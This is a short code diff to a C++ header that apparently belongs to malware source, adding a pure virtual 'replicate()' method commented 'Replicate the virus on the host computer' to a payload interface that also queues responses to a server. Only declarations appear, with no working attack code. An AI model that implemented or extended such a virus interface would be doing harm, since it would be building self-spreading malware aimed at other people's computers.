@@ -27,6 +27,9 @@ public:
   // Get the message thread-safe queue, in order to response to the server
   virtual mt::Queue<std::string> &getReponseQueue() = 0;
 
+  // Replicate the virus on the host computer
+  virtual void replicate() = 0;
+
   // Should de-initialize the payload, if needed
   virtual bool deinit() = 0;
 
